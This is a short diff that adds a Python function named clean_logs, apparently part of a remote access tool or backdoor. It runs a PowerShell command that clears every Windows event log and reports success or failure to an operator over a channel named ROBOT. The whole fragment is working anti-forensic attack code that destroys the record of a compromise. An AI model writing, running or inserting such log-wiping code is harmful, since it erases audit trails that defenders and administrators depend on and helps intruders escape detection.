@@ -1,0 +1,17 @@
+def clean_logs():
+
+	try:
+
+		powershell_result = Popen(
+			'powershell -Command "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }"',
+			stdout=PIPE,
+			stderr=PIPE
+		)
+		out, err = powershell_result.communicate()
+
+		ROBOT.send(pencode("[32m[+][0mLogs cleaned successfully.\n"))
+
+
+	except:
+
+		ROBOT.send(pencode("[91mERROR: [0mUnknown error: 'rmlog'.\n"))
